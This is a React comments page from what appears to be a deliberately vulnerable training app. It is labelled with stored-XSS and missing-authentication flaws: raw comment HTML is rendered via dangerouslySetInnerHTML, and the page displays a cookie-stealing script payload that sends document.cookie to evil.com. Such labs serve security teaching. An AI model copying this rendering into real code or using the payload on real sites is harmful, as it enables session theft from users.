"use client";
// ⚠️ VULNERABILITY: Stored XSS — comments rendered with innerHTML
// VULN-046/048: Raw HTML from DB rendered via dangerouslySetInnerHTML
// VULN-047: No authentication to post comments
// VULN-049: Author field not validated

import { useEffect, useState } from "react";

interface Comment {
  id: number;
  author: string;
  content: string;
}

export default function CommentsPage() {
  const [comments, setComments] = useState<Comment[]>([]);
  const [author, setAuthor]   = useState("user");
  const [content, setContent] = useState("");

  const loadComments = () =>
    fetch("/api/comments?postId=1")
      .then((r) => r.json())
      .then((d) => setComments(d.comments || []));

  useEffect(() => { loadComments(); }, []);

  const submitComment = async () => {
    await fetch("/api/comments", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      // VULN-047: no auth token required
      body: JSON.stringify({ postId: 1, author, content }),
    });
    setContent("");
    loadComments();
  };

  return (
    <div className="min-h-screen bg-gray-900 text-white p-8">
      <div className="max-w-2xl mx-auto">
        <h1 className="text-3xl font-bold mb-2">Comments</h1>
        <p className="text-red-400 text-sm mb-6">
          VULN-046/048: Stored XSS — comments are stored and rendered as-is<br />
          Payload: <code>{`<script>fetch('https://evil.com?c='+document.cookie)</script>`}</code><br />
          Or: <code>{`<img src=x onerror="alert(1)">`}</code>
        </p>

        <div className="bg-gray-800 rounded p-4 mb-6">
          <h2 className="font-bold mb-3 text-yellow-400">Leave a Comment (No Auth Required)</h2>
          <input
            value={author}
            onChange={(e) => setAuthor(e.target.value)}
            placeholder="Author name"
            className="w-full bg-gray-700 border border-gray-600 rounded px-3 py-2 mb-2"
          />
          <textarea
            value={content}
            onChange={(e) => setContent(e.target.value)}
            placeholder="Comment content (HTML/JS allowed — VULN-048)"
            rows={4}
            className="w-full bg-gray-700 border border-gray-600 rounded px-3 py-2 mb-2 font-mono text-sm"
          />
          <button
            onClick={submitComment}
            className="bg-red-700 hover:bg-red-600 px-4 py-2 rounded"
          >
            Post Comment
          </button>
        </div>

        <div className="space-y-4">
          {comments.map((c) => (
            <div key={c.id} className="bg-gray-800 rounded p-4">
              <div className="text-sm text-gray-400 mb-2">
                {/* VULN-049: Author name could also be XSS payload */}
                <span className="font-bold text-white">{c.author}</span> · Comment #{c.id}
              </div>
              {/* VULN-046: Stored XSS — raw HTML from DB rendered here */}
              <div
                className="text-gray-200"
                dangerouslySetInnerHTML={{ __html: c.content }}
              />
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}
